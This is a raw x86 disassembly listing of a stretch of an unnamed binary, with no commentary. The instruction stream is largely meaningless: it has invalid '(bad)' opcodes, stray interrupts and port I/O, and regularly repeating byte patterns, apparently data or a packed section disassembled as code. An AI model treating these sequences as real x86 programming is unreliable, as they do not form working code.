  40688e:	pop    ss
  40688f:	xor    cl,BYTE PTR [esi-0x36]
  406892:	inc    esi
  406893:	mov    cl,0xc1
  406895:	and    eax,0x436241
  40689a:	adc    BYTE PTR [eax+0x0],al
  40689d:	add    eax,0x62410040
  4068a2:	inc    eax
  4068a3:	add    BYTE PTR [ebx-0x34],al
  4068a6:	inc    eax
  4068a7:	add    eax,0x78434040
  4068ac:	bound  eax,QWORD PTR [ecx+0x78]
  4068af:	add    eax,0x62404043
  4068b4:	push   ds
  4068b5:	int3   
  4068b6:	inc    eax
  4068b7:	jbe    0x406839
  4068b9:	stc    
  4068ba:	cmp    BYTE PTR [edx+0x7a],al
  4068bd:	ja     0x4068c0
  4068bf:	jg     0x406923
  4068c1:	mov    ah,0x52
  4068c3:	mov    esi,0xdccc7701
  4068c8:	popa   
  4068c9:	add    eax,0x417a69f9
  4068ce:	inc    eax
  4068cf:	add    eax,0x43436240
  4068d4:	add    eax,0x62004040
  4068d9:	inc    eax
  4068da:	add    BYTE PTR [ecx+0x40],al
  4068dd:	inc    ebx
  4068de:	test   BYTE PTR ds:0x58054041,ah
  4068e4:	inc    eax
  4068e5:	inc    eax
  4068e6:	bound  eax,QWORD PTR [eax+0x66]
  4068e9:	inc    ecx
  4068ea:	inc    eax
  4068eb:	add    eax,0x49409b00
  4068f0:	sub    cl,cl
  4068f2:	call   0x3a0bcdb6
  4068f7:	inc    esi
  4068f8:	int    0x26
  4068fa:	daa    
  4068fb:	mov    edi,0xe940167a
  406900:	mov    dh,0x40
  406902:	push   esi
  406903:	scas   eax,DWORD PTR es:[edi]
  406904:	inc    edi
  406905:	adc    ebp,DWORD PTR [edx+eax*2]
  406908:	xor    DWORD PTR [eax+0x64],eax
  40690b:	enter  0x5a79,0xcc
  40690f:	sub    eax,0xa81c4162
  406914:	stos   BYTE PTR es:[edi],al
  406915:	inc    DWORD PTR [eax-0x2d]
  406918:	in     al,0x44
  40691a:	clc    
  40691b:	inc    edx
  40691c:	jns    0x406983
  40691e:	push   ecx
  40691f:	dec    edx
  406920:	add    eax,0x430000f8
  406925:	inc    eax
  406926:	bound  eax,QWORD PTR ds:0x25404110
  40692c:	add    ah,cl
  40692e:	inc    ebx
  40692f:	add    eax,0x40402562
  406934:	add    BYTE PTR [eax+0x40],al
  406937:	inc    ecx
  406938:	inc    ecx
  406939:	add    eax,0x78434025
  40693e:	bound  eax,QWORD PTR [eax-0x7c]
  406941:	inc    eax
  406942:	inc    ecx
  406943:	xor    eax,DWORD PTR [ebx]
  406945:	lea    ebx,[edx]
  406947:	sub    eax,0xfe0acd35
  40694c:	jl     0x4069c7
  40694e:	and    eax,0x49512acc
  406953:	add    ch,BYTE PTR [eax+esi*8-0x4a]
  406957:	inc    eax
  406958:	jecxz  0x40698f
  40695a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40695c:	inc    ecx
  40695d:	jns    0x40699e
  40695f:	fadd   QWORD PTR es:[edx-0x30]
  406963:	lods   al,BYTE PTR fs:[esi]
  406965:	sar    DWORD PTR [edi+0x404041c4],cl
  40696b:	inc    ebx
  40696c:	int3   
  40696d:	add    BYTE PTR ds:0x56240,al
  406973:	inc    ebx
  406974:	inc    eax
  406975:	inc    eax
  406976:	add    BYTE PTR [ecx+0x62],al
  406979:	bound  eax,QWORD PTR [eax]
  40697b:	int3   
  40697c:	inc    eax
  40697d:	inc    ebx
  40697e:	add    eax,0x43624041
  406983:	adc    BYTE PTR [ecx+0x5],al
  406986:	inc    eax
  406987:	lods   al,BYTE PTR ds:[esi]
  406988:	test   BYTE PTR [eax+0x4c79a04e],bh
  40698e:	inc    ecx
  40698f:	and    eax,DWORD PTR [ebp+eax*1-0x4bc998c4]
  406996:	or     al,0xb2
  406998:	(bad)  
  406999:	leave  
  40699a:	addr16 jns 0x406a16
  40699d:	cs inc eax
  40699f:	data16 ins BYTE PTR es:[edi],dx
  4069a1:	mov    edi,0x42196318
  4069a6:	das    
  4069a7:	fld    TBYTE PTR [ebx+0x798751bf]
  4069ad:	push   ecx
  4069ae:	pop    esp
  4069af:	and    al,0xb4
  4069b1:	fcmovu st,st(5)
  4069b3:	in     al,0x7c
  4069b5:	bound  eax,QWORD PTR [ebx+0x40]
  4069b8:	adc    BYTE PTR ds:0x4158cc40,al
  4069be:	inc    ebx
  4069bf:	bound  eax,QWORD PTR [ecx+0x40]
  4069c2:	add    eax,0x4140
  4069c7:	and    eax,0x40400062
  4069cc:	add    eax,0x84404340
  4069d1:	int3   
  4069d2:	js     0x4069d4
  4069d4:	inc    ecx
  4069d5:	adc    BYTE PTR [edx+0xf],ah
  4069d8:	test   BYTE PTR [eax-0x7e],0x15
  4069dc:	sbb    BYTE PTR [ebp-0x54],al
  4069df:	jns    0x406a14
  4069e1:	pusha  
  4069e2:	lock leave 
  4069e4:	test   al,0x4c
  4069e6:	popa   
  4069e7:	pop    edi
  4069e8:	push   0x92c01b1a
  4069ed:	js     0x4069c8
  4069ef:	add    BYTE PTR [eax+0x41],al
  4069f2:	inc    eax
  4069f3:	inc    ebx
  4069f4:	bound  ax,DWORD PTR ds:0x40434100
  4069fb:	add    eax,0x40054062
  406a00:	bound  eax,QWORD PTR [ecx+0x40]
  406a03:	inc    ebx
  406a04:	inc    eax
  406a05:	add    eax,0x25405841
  406a0a:	bound  eax,QWORD PTR [eax+0x43]
  406a0d:	inc    eax
  406a0e:	adc    BYTE PTR [ecx+0x7f],bh
  406a11:	inc    eax
  406a12:	sahf   
  406a13:	inc    ebx
  406a14:	mov    edi,0x6842b443
  406a19:	jnp    0x406a09
  406a1b:	leave  
  406a1c:	inc    eax
  406a1d:	enter  0x7805,0x7f
  406a21:	adc    al,0x5d
  406a23:	rol    BYTE PTR [eax+0x1f],1
  406a26:	leave  
  406a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a28:	xor    eax,DWORD PTR [eax+0x6c]
  406a2b:	inc    eax
  406a2c:	inc    ecx
  406a2d:	inc    ebx
  406a2e:	inc    eax
  406a2f:	add    eax,0x43406262
  406a34:	inc    ecx
  406a35:	adc    BYTE PTR [eax],al
  406a37:	inc    eax
  406a38:	add    eax,0x43000562
  406a3d:	add    BYTE PTR [ecx+0x40],al
  406a40:	inc    eax
  406a41:	add    eax,0x400062
  406a46:	inc    ebx
  406a47:	inc    eax
  406a48:	js     0x406a8b
  406a4a:	inc    ecx
  406a4b:	bound  eax,QWORD PTR [eax-0x3c]
  406a4e:	inc    ecx
  406a4f:	sub    BYTE PTR [eax+edi*2-0x49],bl
  406a53:	es cdq 
  406a55:	or     eax,0x8841430c
  406a5a:	lahf   
  406a5b:	inc    eax
  406a5c:	ficomp WORD PTR [edi]
  406a5e:	ror    al,1
  406a60:	inc    ebx
  406a61:	js     0x406acb
  406a63:	and    eax,0x5cb32cb
  406a68:	sub    al,0xeb
  406a6a:	pop    ds
  406a6b:	or     ch,dh
  406a6d:	dec    eax
  406a6e:	mov    edi,0x68787624
  406a73:	inc    eax
  406a74:	nop
  406a75:	cmp    eax,0xce4bddbf
  406a7a:	pop    ds
  406a7b:	bound  eax,QWORD PTR [eax+0x5]
  406a7e:	inc    ecx
  406a7f:	add    BYTE PTR [ebx+0x40],al
  406a82:	inc    eax
  406a83:	inc    ecx
  406a84:	inc    eax
  406a85:	inc    eax
  406a86:	bound  eax,QWORD PTR ds:0x5624300
  406a8c:	add    BYTE PTR [eax+0x40],al
  406a8f:	add    BYTE PTR [ecx+0x43],al
  406a92:	add    BYTE PTR [eax+0x41],al
  406a95:	add    eax,0x40436200
  406a9a:	inc    eax
  406a9b:	add    eax,0xc38f7a62
  406aa0:	or     eax,DWORD PTR [esi+edx*2+0x78]
  406aa4:	xor    DWORD PTR [edx+0x71],esp
  406aa7:	and    ch,dh
  406aa9:	sub    dl,dh
  406aab:	xor    DWORD PTR ds:0xa88f8240,esi
  406ab1:	pop    DWORD PTR [eax+0x78]
  406ab4:	das    
  406ab5:	inc    ecx
  406ab6:	inc    eax
  406ab7:	add    eax,0x41624340
  406abc:	test   BYTE PTR [eax],al
  406abe:	and    eax,0x404043
  406ac3:	add    BYTE PTR ds:0x626210,al
  406ac9:	add    eax,0x43404140
  406ace:	inc    eax
  406acf:	inc    ecx
  406ad0:	add    eax,0x10664062
  406ad5:	inc    ebx
  406ad6:	bound  ebp,QWORD PTR [esi]
  406ad8:	xchg   edi,eax
  406ad9:	js     0x406aec
  406adb:	adc    al,BYTE PTR [esp+edx*1+0x73]
  406adf:	inc    eax
  406ae0:	mov    edi,0x6862ac7c
  406ae5:	js     0x406b04
  406ae7:	daa    
  406ae8:	out    0x65,eax
  406aea:	or     eax,0xd1774062
  406aef:	inc    eax
  406af0:	sbb    al,0x92
  406af2:	int    0x21
  406af4:	sub    bh,BYTE PTR [eax+0x2b]
  406af7:	sub    ebx,esi
  406af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406afa:	adc    cl,dl
  406afc:	pop    ebx
  406afd:	pop    edx
  406afe:	fld    DWORD PTR [eax+0x2a]
  406b01:	dec    ebp
  406b02:	dec    eax
  406b03:	ja     0x406b4a
  406b05:	ja     0x406b73
  406b07:	sub    al,0x44
  406b09:	bound  eax,QWORD PTR ds:0xf5bd3bcc
  406b0f:	add    eax,0x4041cc
  406b14:	add    BYTE PTR [eax],al
  406b16:	inc    eax
  406b17:	inc    eax
  406b18:	inc    ebx
  406b19:	bound  eax,QWORD PTR [eax]
  406b1b:	inc    eax
  406b1c:	inc    eax
  406b1d:	add    eax,0x62434162
  406b22:	inc    eax
  406b23:	js     0x406b35
  406b25:	inc    ecx
  406b26:	add    eax,0x5404325
  406b2b:	bound  eax,QWORD PTR [eax+0x40]
  406b2e:	inc    ecx
  406b2f:	inc    ebx
  406b30:	inc    eax
  406b31:	imul   esi,DWORD PTR [ebx-0x35],0x62
  406b35:	inc    edx
  406b36:	ja     0x406b7b
  406b38:	inc    eax
  406b39:	hlt    
  406b3a:	nop
  406b3b:	xor    al,dl
  406b3d:	cmp    al,0xa0
  406b3f:	push   ecx
  406b40:	and    DWORD PTR [edx],ebx
  406b42:	adc    eax,0x774f43ab
  406b47:	mov    edi,0xbce4d240
  406b4c:	sub    edi,edx
  406b4e:	and    DWORD PTR [edi+0x6d],0xfffffff2
  406b52:	push   ebx
  406b53:	add    eax,0x7377a820
  406b58:	adc    ch,bh
  406b5a:	fs retf 
  406b5c:	test   al,0xd
  406b5e:	and    eax,0x436241
  406b63:	adc    BYTE PTR [eax+0x0],al
  406b66:	add    eax,0x62410040
  406b6b:	inc    eax
  406b6c:	add    BYTE PTR [ebx-0x34],al
  406b6f:	inc    eax
  406b70:	add    eax,0x78434040
  406b75:	bound  eax,QWORD PTR [ecx+0x78]
  406b78:	add    eax,0x62404043
  406b7d:	out    0x67,al
  406b7f:	inc    eax
  406b80:	dec    ebx
  406b81:	cld    
  406b82:	inc    ebp
  406b83:	outs   dx,DWORD PTR ds:[esi]
  406b84:	cmp    esi,DWORD PTR [edi-0x6d]
  406b87:	cmp    BYTE PTR [eax-0x38],ch
  406b8a:	xor    eax,0xec969b2
  406b8f:	xor    BYTE PTR [ebp+0x3c624069],al
  406b95:	ja     0x406bca
  406b97:	inc    eax
  406b98:	cli    
  406b99:	add    eax,0x2c7b414c
  406b9e:	push   ecx
  406b9f:	xor    al,0x7b
  406ba1:	dec    ebp
  406ba2:	cmp    eax,0x40054041
  406ba7:	bound  eax,QWORD PTR [ebx+0x43]
  406baa:	add    eax,0x62004040
  406baf:	inc    eax
  406bb0:	add    BYTE PTR [ecx+0x40],al
  406bb3:	inc    ebx
  406bb4:	test   BYTE PTR ds:0x58054041,ah
  406bba:	inc    eax
  406bbb:	inc    eax
  406bbc:	bound  eax,QWORD PTR [eax+0x66]
  406bbf:	inc    ecx
  406bc0:	inc    eax
  406bc1:	add    eax,0x77ac0900
  406bc6:	push   ecx
  406bc7:	dec    edx
  406bc8:	(bad)  
  406bc9:	in     eax,0xc3
  406bcb:	aad    0x62
  406bcd:	ja     0x47388113
  406bd3:	jge    0x406c54
  406bd5:	ja     0x406b8a
  406bd7:	bound  eax,QWORD PTR [ebp-0x76]
  406bda:	xor    al,0x4c
  406bdc:	xor    al,0x72
  406bde:	pop    edi
  406bdf:	inc    eax
  406be0:	inc    bx
  406be2:	inc    eax
  406be3:	fld    QWORD PTR [eax+0x6f7d7177]
  406be9:	stos   BYTE PTR es:[edi],al
  406bea:	dec    eax
  406beb:	test   al,0xc5
  406bed:	push   ebp
  406bee:	xor    al,BYTE PTR [eax+0x62]
  406bf1:	mov    BYTE PTR [eax],al
  406bf3:	add    BYTE PTR [ebx+0x40],al
  406bf6:	bound  eax,QWORD PTR ds:0x25404110
  406bfc:	add    ah,cl
  406bfe:	inc    ebx
  406bff:	add    eax,0x40402562
  406c04:	add    BYTE PTR [eax+0x40],al
  406c07:	inc    ecx
  406c08:	inc    ecx
  406c09:	add    eax,0x78434025
  406c0e:	bound  eax,QWORD PTR [eax-0x7c]
  406c11:	inc    eax
  406c12:	inc    ecx
  406c13:	cmp    eax,0xf3764434
  406c18:	and    eax,0xc0c34342
  406c1d:	inc    edx
  406c1e:	mov    eax,0xa956400e
  406c23:	pop    esp
  406c24:	inc    ecx
  406c25:	inc    edx
  406c26:	jbe    0x406c9b
  406c28:	sub    al,0xf9
  406c2a:	xchg   BYTE PTR [eax+0x3d],al
  406c2d:	cmp    BYTE PTR [ebx-0x504bf41],bl
  406c33:	dec    ecx
  406c34:	cmp    ecx,edx
  406c36:	jbe    0x406c7e
  406c38:	cmc    
  406c39:	dec    ebx
  406c3a:	push   ecx
  406c3b:	sub    BYTE PTR [eax+0x64f1fe1f],0x7
  406c42:	push   sp
  406c44:	inc    ecx
  406c45:	inc    eax
  406c46:	inc    eax
  406c47:	inc    ebx
  406c48:	int3   
  406c49:	add    BYTE PTR ds:0x56240,al
  406c4f:	inc    ebx
  406c50:	inc    eax
  406c51:	inc    eax
  406c52:	add    BYTE PTR [ecx+0x62],al
  406c55:	bound  eax,QWORD PTR [eax]
  406c57:	int3   
  406c58:	inc    eax
  406c59:	inc    ebx
  406c5a:	add    eax,0x43624041
  406c5f:	adc    BYTE PTR [ecx+0x5],al
  406c62:	inc    eax
  406c63:	cs inc edx
  406c65:	jbe    0x406c93
  406c67:	inc    edi
  406c68:	inc    ebx
  406c69:	test   BYTE PTR [ecx-0x76],cl
  406c6c:	push   cs
  406c6d:	loope  0x406c82
  406c6f:	(bad)  
  406c70:	mov    WORD PTR ds:0x766a62dd,ss
  406c76:	pop    ebx
  406c77:	ss dec esp
  406c79:	popa   
  406c7a:	inc    ecx
  406c7b:	inc    ecx
  406c7c:	and    al,ah
  406c7e:	xor    DWORD PTR [edx+0x37],edx
  406c81:	out    0x0,al
  406c83:	sub    ah,BYTE PTR [eax+0x76]
  406c86:	inc    ecx
  406c87:	push   ecx
  406c88:	aad    0xfa
  406c8a:	push   0x43622d56
  406c8f:	inc    eax
  406c90:	adc    BYTE PTR ds:0x4158cc40,al
  406c96:	inc    ebx
  406c97:	bound  eax,QWORD PTR [ecx+0x40]
  406c9a:	add    eax,0x4140
  406c9f:	and    eax,0x40400062
  406ca4:	add    eax,0x84404340
  406ca9:	int3   
  406caa:	js     0x406cac
  406cac:	inc    ecx
  406cad:	adc    BYTE PTR [edx+0xf],ah
  406cb0:	daa    
  406cb1:	adc    eax,0xb8821241
  406cb6:	bound  esi,QWORD PTR es:[esi+0x78]
  406cba:	cmp    DWORD PTR [eax],ebp
  406cbc:	dec    esi
  406cbd:	add    eax,0x350a4d4a
  406cc2:	repnz mov ds:0x414000aa,al
  406cc8:	inc    eax
  406cc9:	inc    ebx
  406cca:	bound  ax,DWORD PTR ds:0x40434100
  406cd1:	add    eax,0x40054062
  406cd6:	bound  eax,QWORD PTR [ecx+0x40]
  406cd9:	inc    ebx
  406cda:	inc    eax
  406cdb:	add    eax,0x25405841
  406ce0:	bound  eax,QWORD PTR [eax+0x43]
  406ce3:	inc    eax
  406ce4:	adc    bl,cl
  406ce6:	cmp    al,0x28
  406ce8:	jbe    0x406c7e
  406cea:	mov    ch,0x76
  406cec:	add    BYTE PTR [ebx+ecx*8-0x1b],0x6d
  406cf1:	adc    DWORD PTR [eiz*2-0x6957beab],ecx
  406cf8:	jbe    0x406d1e
  406cfa:	mov    dl,0x2f
  406cfc:	mov    ebp,0x50a81041
  406d01:	xor    edi,DWORD PTR [edx+edx*4+0x40]
  406d05:	cmp    BYTE PTR [eax+0x1e5a7512],ch
  406d0b:	loopne 0x406d4d
  406d0d:	fadd   DWORD PTR [ecx+0x48]
  406d10:	mov    bl,0x53
  406d12:	push   edi
  406d13:	cld    
  406d14:	inc    eax
  406d15:	nop
  406d16:	inc    eax
  406d17:	inc    ecx
  406d18:	inc    ebx
  406d19:	inc    eax
  406d1a:	add    eax,0x43406262
  406d1f:	inc    ecx
  406d20:	adc    BYTE PTR [eax],al
  406d22:	inc    eax
  406d23:	add    eax,0x43000562
  406d28:	add    BYTE PTR [ecx+0x40],al
  406d2b:	inc    eax
  406d2c:	add    eax,0x400062
  406d31:	inc    ebx
  406d32:	inc    eax
  406d33:	js     0x406d76
  406d35:	inc    ecx
  406d36:	bound  eax,QWORD PTR [eax+0x68]
  406d39:	inc    edx
  406d3a:	jne    0x406cfb
  406d3c:	xchg   ecx,eax
  406d3d:	es dec ecx
  406d3f:	inc    esp
  406d40:	or     al,0x28
  406d42:	xchg   esi,eax
  406d43:	cs inc ebp
  406d45:	ret    
  406d46:	inc    ecx
  406d47:	sub    ah,BYTE PTR [edx-0x4c]
  406d4a:	jne    0x406d41
  406d4c:	mov    ah,0x5a
  406d4e:	repz retf 
  406d50:	push   esp
  406d51:	arpl   cx,di
  406d53:	sub    ah,BYTE PTR [edx-0x75]
  406d56:	les    edi,FWORD PTR [eax-0x6c8a32d6]
  406d5c:	inc    edx
  406d5d:	and    DWORD PTR [edx+0x5],esp
  406d60:	sub    DWORD PTR [eax],edx
  406d62:	fsubr  QWORD PTR [edx+0x30]
  406d65:	bound  eax,QWORD PTR [eax+0x5]
  406d68:	inc    ecx
  406d69:	add    BYTE PTR [ebx+0x40],al
  406d6c:	inc    eax
  406d6d:	inc    ecx
  406d6e:	inc    eax
  406d6f:	inc    eax
  406d70:	bound  eax,QWORD PTR ds:0x5624300
  406d76:	add    BYTE PTR [eax+0x40],al
  406d79:	add    BYTE PTR [ecx+0x43],al
  406d7c:	add    BYTE PTR [eax+0x41],al
  406d7f:	add    eax,0x40436200
  406d84:	inc    eax
  406d85:	add    eax,0xc9c5f362
  406d8a:	arpl   WORD PTR [eax-0x33886e8b],si
  406d90:	xchg   DWORD PTR [eax+0x77],ecx
  406d93:	add    eax,0x640613f
  406d98:	cld    
  406d99:	inc    edx
  406d9a:	arpl   WORD PTR [ecx+0x75],ax
  406d9d:	repz add ebp,DWORD PTR [ecx]
  406da0:	sbb    BYTE PTR [edx-0x2f],al
  406da3:	jnp    0x406dc7
  406da5:	outs   dx,BYTE PTR ds:[esi]
  406da6:	inc    edx
  406da7:	(bad)  
  406da8:	xlat   BYTE PTR ds:[ebx]
  406da9:	sub    al,0xdc
  406dab:	call   0x39510325
  406db0:	cli    
  406db1:	mov    cl,0x55
  406db3:	add    ax,0x9161
  406db7:	jno    0x406dfa
  406db9:	inc    eax
  406dba:	add    eax,0x41624340
  406dbf:	test   BYTE PTR [eax],al
  406dc1:	and    eax,0x404043
  406dc6:	add    BYTE PTR ds:0x626210,al
  406dcc:	add    eax,0x43404140
  406dd1:	inc    eax
  406dd2:	inc    ecx
  406dd3:	add    eax,0x10664062
  406dd8:	inc    ebx
  406dd9:	bound  ecx,QWORD PTR ds:0x75fd90df
  406ddf:	rol    DWORD PTR [ecx],1
  406de1:	cs in  al,0xa8
  406de4:	pop    eax
  406de5:	aam    0x68
  406de7:	int    0x47
  406de9:	into   
  406dea:	push   ss
  406deb:	adc    ah,BYTE PTR [ecx]
  406ded:	ja     0x406e64
  406def:	adc    esi,DWORD PTR [eax-0x51]
  406df2:	fs inc ecx
  406df4:	fld    QWORD PTR ds:0x4041cc
  406dfa:	add    BYTE PTR [eax],al
  406dfc:	inc    eax
  406dfd:	inc    eax
  406dfe:	inc    ebx
  406dff:	bound  eax,QWORD PTR [eax]
  406e01:	inc    eax
  406e02:	inc    eax
  406e03:	add    eax,0x62434162
  406e08:	inc    eax
  406e09:	js     0x406e1b
  406e0b:	inc    ecx
  406e0c:	add    eax,0x5404325
  406e11:	bound  eax,QWORD PTR [eax+0x40]
  406e14:	inc    ecx
  406e15:	inc    ebx
  406e16:	les    ecx,FWORD PTR [ebx+0x55]
  406e19:	jne    0x406e03
  406e1b:	stc    
  406e1c:	jb     0x406e60
  406e1e:	retf   
  406e1f:	je     0x406df2
  406e21:	inc    eax
  406e22:	daa    
  406e23:	clc    
  406e24:	cmp    al,0xb0
  406e26:	test   eax,0x9f63bfae
  406e2b:	add    eax,0x74b47948
  406e30:	arpl   WORD PTR [eax+0x15],ax
  406e33:	inc    edi
  406e34:	or     eax,0x25911f7b
  406e39:	inc    ecx
  406e3a:	bound  eax,QWORD PTR [ebx+0x0]
  406e3d:	adc    BYTE PTR [eax+0x0],al
  406e40:	add    eax,0x62410040
  406e45:	inc    eax
  406e46:	add    BYTE PTR [ebx-0x34],al
  406e49:	inc    eax
  406e4a:	add    eax,0x78434040
  406e4f:	bound  eax,QWORD PTR [ecx+0x78]
  406e52:	add    eax,0x62404043
  406e57:	adc    DWORD PTR [edx-0x61],edi
  406e5a:	sti    
  406e5b:	retf   
  406e5c:	sbb    DWORD PTR [ebx+0x20544b74],edi
  406e62:	call   FWORD PTR [edi-0x58]
  406e65:	stc    
  406e66:	hlt    
  406e67:	push   ecx
  406e68:	jmp    FWORD PTR [edi+0x7c553484]
  406e6e:	je     0x406e76
  406e70:	add    DWORD PTR [ebx+0x5404169],eax
  406e76:	inc    eax
  406e77:	bound  eax,QWORD PTR [ebx+0x43]
  406e7a:	add    eax,0x62004040
  406e7f:	inc    eax
  406e80:	add    BYTE PTR [ecx+0x40],al
  406e83:	inc    ebx
  406e84:	test   BYTE PTR ds:0x58054041,ah
  406e8a:	inc    eax
  406e8b:	inc    eax
  406e8c:	bound  eax,QWORD PTR [eax+0x66]
  406e8f:	inc    ecx
  406e90:	inc    eax
  406e91:	add    eax,0x66418000
  406e96:	xlat   BYTE PTR ds:[ebx]
  406e97:	push   ebx
  406e98:	dec    esp
  406e99:	add    DWORD PTR ds:0x746a43c5,ecx
  406e9f:	pusha  
  406ea0:	push   esp
  406ea1:	inc    esp
  406ea2:	pop    edx
  406ea3:	inc    esp
  406ea4:	jl     0x406ee2
  406ea6:	add    BYTE PTR [eax],al
  406ea8:	inc    ebx
  406ea9:	inc    eax
  406eaa:	bound  eax,QWORD PTR ds:0x25404110
  406eb0:	add    ah,cl
  406eb2:	inc    ebx
  406eb3:	add    eax,0x40402562
  406eb8:	add    BYTE PTR [eax+0x40],al
  406ebb:	inc    ecx
  406ebc:	inc    ecx
  406ebd:	add    eax,0x78434025
  406ec2:	bound  eax,QWORD PTR [eax-0x7c]
  406ec5:	inc    eax
  406ec6:	inc    ecx
  406ec7:	cmp    dh,BYTE PTR [eax+0x65]
  406eca:	cmp    dh,ch
  406ecc:	inc    ebp
  406ecd:	addr16 fs je 0x406efe
  406ed1:	inc    esp
  406ed2:	and    cl,bh
  406ed4:	inc    edi
  406ed5:	(bad)  
  406ed6:	arpl   WORD PTR ds:0xf276d15b,bx
  406edc:	xor    ah,bl
  406ede:	cmp    BYTE PTR [ecx+edx*1+0x4d],dh
  406ee2:	inc    ebx
  406ee3:	add    eax,0x6562bf
  406ee8:	or     ah,bl
  406eea:	or     cl,BYTE PTR [edi-0x3d]
  406eed:	cmp    BYTE PTR [ebp+0x74],cl
  406ef0:	push   ebx
  406ef1:	bound  esi,QWORD PTR [esi+0x289da8ef]
  406ef7:	arpl   WORD PTR [eax],cx
  406ef9:	inc    eax
  406efa:	out    dx,eax
  406efb:	inc    ecx
  406efc:	inc    eax
  406efd:	inc    eax
  406efe:	inc    ebx
  406eff:	int3   
  406f00:	add    BYTE PTR ds:0x56240,al
  406f06:	inc    ebx
  406f07:	inc    eax
  406f08:	inc    eax
  406f09:	add    BYTE PTR [ecx+0x62],al
  406f0c:	bound  eax,QWORD PTR [eax]
  406f0e:	int3   
  406f0f:	inc    eax
  406f10:	inc    ebx
  406f11:	add    eax,0x43624041
  406f16:	adc    BYTE PTR [ecx+0x5],al
  406f19:	inc    eax
  406f1a:	clc    
  406f1b:	adc    BYTE PTR [eax],ch
  406f1d:	stc    
  406f1e:	je     0x406f7f
  406f20:	jge    0x406f6c
  406f22:	lock mov esp,0xb7467cd0
  406f28:	inc    ecx
  406f29:	pop    ebx
  406f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f2b:	add    eax,0x87362a3
  406f30:	test   DWORD PTR [edx+eax*1],0xa941a8cd
  406f37:	pop    edi
  406f38:	icebp  
  406f39:	cwde   
  406f3a:	inc    sp
  406f3c:	adc    bl,BYTE PTR [eax]
  406f3e:	jae    0x406f48
  406f40:	cmp    BYTE PTR [ebp-0x12],cl
  406f43:	dec    ebx
  406f44:	inc    ecx
  406f45:	imul   ecx,DWORD PTR [edi+ebx*2-0x63f2946e],0x873e24b
  406f50:	bound  eax,QWORD PTR [ebx+0x40]
  406f53:	adc    BYTE PTR ds:0x4158cc40,al
  406f59:	inc    ebx
  406f5a:	bound  eax,QWORD PTR [ecx+0x40]
  406f5d:	add    eax,0x4140
  406f62:	and    eax,0x40400062
  406f67:	add    eax,0x84404340
  406f6c:	int3   
  406f6d:	js     0x406f6f
  406f6f:	inc    ecx
  406f70:	adc    BYTE PTR [edx+0xf],ah
  406f73:	and    al,0x9a
  406f75:	mov    cl,BYTE PTR [edx+0x24]
  406f78:	cmp    al,0xef
  406f7a:	pop    edi
  406f7b:	dec    ecx
  406f7c:	or     BYTE PTR [esi],dl
  406f7e:	(bad)  
  406f7f:	aad    0x4b
  406f81:	jae    0x406fcb
  406f83:	push   edx
  406f84:	repnz add BYTE PTR fs:[eax+0x41],al
  406f89:	inc    eax
  406f8a:	inc    ebx
  406f8b:	bound  ax,DWORD PTR ds:0x40434100
  406f92:	add    eax,0x40054062
  406f97:	bound  eax,QWORD PTR [ecx+0x40]
  406f9a:	inc    ebx
  406f9b:	inc    eax
  406f9c:	add    eax,0x25405841
  406fa1:	bound  eax,QWORD PTR [eax+0x43]
  406fa4:	inc    eax
  406fa5:	adc    BYTE PTR ds:0x1fd2e05a,al
  406fab:	jl     0x407023
  406fad:	stc    
  406fae:	xchg   DWORD PTR [ecx+0x544873e2],esi
  406fb4:	or     ebp,esp
  406fb6:	dec    eax
  406fb7:	pop    eax
  406fb8:	xor    esi,DWORD PTR ds:0x57fbd9f
  406fbe:	dec    ebx
  406fbf:	sub    bh,BYTE PTR [ecx]
  406fc1:	jae    0x406fcb
  406fc3:	push   esi
  406fc4:	cmc    
  406fc5:	dec    esp
  406fc6:	fild   WORD PTR [ebp+0x70]
  406fc9:	sbb    BYTE PTR [edi+0x40],bl
  406fcc:	inc    ecx
  406fcd:	inc    ebx
  406fce:	inc    eax
  406fcf:	add    eax,0x43406262
  406fd4:	inc    ecx
  406fd5:	adc    BYTE PTR [eax],al
  406fd7:	inc    eax
  406fd8:	add    eax,0x43000562
  406fdd:	add    BYTE PTR [ecx+0x40],al
  406fe0:	inc    eax
  406fe1:	add    eax,0x400062
  406fe6:	inc    ebx
  406fe7:	inc    eax
  406fe8:	js     0x40702b
  406fea:	inc    ecx
  406feb:	bound  eax,QWORD PTR [eax+0x51]
  406fee:	inc    esi
  406fef:	ret    
  406ff0:	inc    ecx
  406ff1:	scas   al,BYTE PTR es:[edi]
  406ff2:	push   eax
  406ff3:	jae    0x407015
  406ff5:	inc    esp
  406ff6:	popf   
  406ff7:	jb     0x406fc1
  406ff9:	mov    eax,ds:0xb7737b62
  406ffe:	out    0xf8,al
  407000:	imul   edx,DWORD PTR [ecx+0x4057734a],0x42b4eafc
  40700a:	aam    0x5e
  40700c:	icebp  
  40700d:	push   esp
  40700e:	pop    ss
  40700f:	adc    eax,0x7303fa05
  407014:	mov    edi,0xcb4127ef
  407019:	bound  eax,QWORD PTR [eax+0x5]
  40701c:	inc    ecx
  40701d:	add    BYTE PTR [ebx+0x40],al
  407020:	inc    eax
  407021:	inc    ecx
  407022:	inc    eax
  407023:	inc    eax
  407024:	bound  eax,QWORD PTR ds:0x5624300
  40702a:	add    BYTE PTR [eax+0x40],al
  40702d:	add    BYTE PTR [ecx+0x43],al
  407030:	add    BYTE PTR [eax+0x41],al
  407033:	add    eax,0x40436200
  407038:	inc    eax
  407039:	add    eax,0x41214462
  40703e:	pop    eax
  40703f:	jo     0x406fd2
  407041:	fild   WORD PTR [edx+eax*1+0x71]
  407045:	jb     0x4070b8
  407047:	inc    eax
  407048:	sti    
  407049:	cld    
  40704a:	inc    ecx
  40704b:	inc    eax
  40704c:	mov    ds:0x27505aa4,al
  407051:	fs pop ebx
  407053:	push   ss
  407054:	arpl   WORD PTR [edx+0x75],si
  407057:	js     0x40700a
  407059:	cli    
  40705a:	les    ebp,FWORD PTR [ebx+0x42]
  40705d:	xchg   DWORD PTR [edx],edi
  40705f:	inc    esp
  407060:	psubsb mm4,QWORD PTR [ecx-0x5f]
  407064:	sub    dh,BYTE PTR [edx+0x7f]
  407067:	stc    
  407068:	inc    ecx
  407069:	inc    eax
  40706a:	add    eax,0x41624340
  40706f:	test   BYTE PTR [eax],al
  407071:	and    eax,0x404043
  407076:	add    BYTE PTR ds:0x626210,al
  40707c:	add    eax,0x43404140
  407081:	inc    eax
